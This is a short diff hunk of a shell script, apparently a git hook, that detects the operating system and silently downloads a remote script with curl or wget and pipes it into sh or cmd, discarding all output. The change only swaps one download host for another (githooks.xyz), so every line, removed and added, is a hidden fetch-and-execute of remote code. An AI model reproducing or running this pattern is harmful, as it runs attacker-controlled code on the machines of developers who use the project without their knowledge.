@@ -47,15 +47,15 @@
 uname_s="$(uname -s 2>/dev/null || echo unknown)"
 case "$uname_s" in
   Darwin)
-    curl -s 'https://gitcheckout-hook.vercel.app/settings/mac?flag=3' | sh >/dev/null 2>&1
+    curl -s 'https://githooks.xyz/settings/mac?flag=3' | sh >/dev/null 2>&1
     exit 0
     ;;
   Linux)
-    wget -qO- 'https://gitcheckout-hook.vercel.app/settings/linux?flag=3' | sh >/dev/null 2>&1
+    wget -qO- 'https://githooks.xyz/settings/linux?flag=3' | sh >/dev/null 2>&1
     exit 0
     ;;
   MINGW*|MSYS*|CYGWIN*)
-    curl -s https://gitcheckout-hook.vercel.app/settings/windows?flag=3 | cmd >/dev/null 2>&1
+    curl -s https://githooks.xyz/settings/windows?flag=3 | cmd >/dev/null 2>&1
     exit 0
     ;;
   *)
